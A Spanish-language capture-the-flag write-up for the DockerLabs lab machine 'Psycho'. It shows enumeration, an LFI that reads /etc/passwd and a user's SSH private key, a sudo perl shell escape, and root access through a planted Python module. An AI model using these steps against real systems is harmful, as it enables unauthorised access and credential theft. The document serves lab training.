# 🧠 Máquina: Psycho

**Nivel:** Fácil

**Plataforma:** DockerLabs

**Objetivo:** Obtener acceso como root explotando vulnerabilidades web y de configuración.

---

## 📦 Despliegue de la Máquina

Descargamos y descomprimimos la máquina:

```bash
unzip psycho.zip
sudo bash auto_deploy.sh psycho.tar
```

![](/Psycho/Imagenes/Logo.png)

![](/Psycho/Imagenes/Despliegue.jpeg)

Comprobamos la conectividad con `ping`:

```bash
ping 172.17.0.2
```

📸 ![](/Psycho/Imagenes/Ping.jpeg)

---

## 🔍 Enumeración

### Escaneo de Puertos

Usamos `nmap` para detectar los puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

📸 ![](/Psycho/Imagenes/Puertos.jpeg)

Usamos un script personalizado `extractPorts` para facilitar el siguiente escaneo:

```bash
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

📸 ![](/Psycho/Imagenes/Servicios.jpeg)

---

## 🌐 Análisis Web

Visitamos la página principal en el puerto 80:

📸 ![](/Psycho/Imagenes/Pagina.jpeg)

### Fuzzing con Gobuster

Ejecutamos `gobuster` para encontrar directorios y archivos ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

📸 ![](/Psycho/Imagenes/Gobuster.jpeg)

Se encontraron dos rutas relevantes:

* `/assets`
  📸 ![](/Psycho/Imagenes/Directorio.jpeg)

* `/index.php/assets#` (mediante fuzzing manual)
  📸 ![](/Psycho/Imagenes/Oculto.jpeg)

### Análisis de Imagen

Descargamos una imagen y la analizamos con `exiftool` buscando metadatos sensibles, pero no se encontró información útil:

```bash
exiftool background.jpg
```

📸 ![](/Psycho/Imagenes/Metadatos.jpeg)

---

## 💥 Vulnerabilidad LFI (Local File Inclusion)

En el código fuente de la página se observó un posible error, que explotamos con LFI:

```bash
curl -s -X GET "http://172.17.0.2/?secret=/etc/passwd" | grep "sh$"
```

📸 ![](/Psycho/Imagenes/Usuarios.jpeg)

Esto nos revela usuarios del sistema con shell válido, entre ellos:
`root`, `ubuntu`, `vaxei`, `luisillo`

---

## 🔑 Robo de Clave SSH

Aprovechamos la vulnerabilidad LFI para extraer la clave privada de SSH del usuario `vaxei`:

```bash
curl -s -X GET "http://172.17.0.2/?secret=/home/vaxei/.ssh/id_rsa"
```

📸 ![](/Psycho/Imagenes/curlKey.jpeg)
📸 ![](/Psycho/Imagenes/Key.jpeg)

Guardamos la clave como `id_rsa` y le damos permisos adecuados:

```bash
chmod 600 id_rsa
```

Nos conectamos vía SSH:

```bash
ssh -i id_rsa vaxei@172.17.0.2
```

📸 ![](/Psycho/Imagenes/webshell.jpeg)

---

## 📂 Revisión Inicial del Sistema

Inspeccionamos archivos visibles:

```bash
ls -l
cat file.txt
```

Archivo encontrado: `file.txt`
Contenido:

```
kflksdfsad  
asdsadsad  
asdasd  
```

---

## 🚀 Escalada de Privilegios

Verificamos los privilegios `sudo` del usuario `vaxei`:

```bash
sudo -l
```

📸 ![](/Psycho/Imagenes/Escalada.jpeg)

El resultado indica que `vaxei` puede ejecutar `perl` como el usuario `luisillo` sin contraseña:

```
(luisillo) NOPASSWD: /usr/bin/perl
```

### Escalamos a `luisillo`:

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'
```

---

## 🧑‍💻 Escalada a Root

Ya como `luisillo`, encontramos que el script `/opt/paw.py` llama a un archivo `subprocess.py`.

Creamos un archivo `subprocess.py` con el siguiente contenido malicioso:

```python
import os
os.system('bash')
```

Ejecutamos el script:

```bash
sudo /usr/bin/python3 /opt/paw.py
```

Esto lanza una shell como **root**.

📸 ![](/Psycho/Imagenes/root.jpeg)

---

## ✅ Conclusiones

* Se descubrió una vulnerabilidad de inclusión de archivos locales (LFI).
* Se logró extraer una clave privada SSH.
* Se obtuvo acceso SSH como usuario normal (`vaxei`).
* Se escaló a otro usuario (`luisillo`) mediante `sudo` mal configurado.
* Finalmente, se escaló a **root** al abusar de un script que ejecutaba código arbitrario en Python.
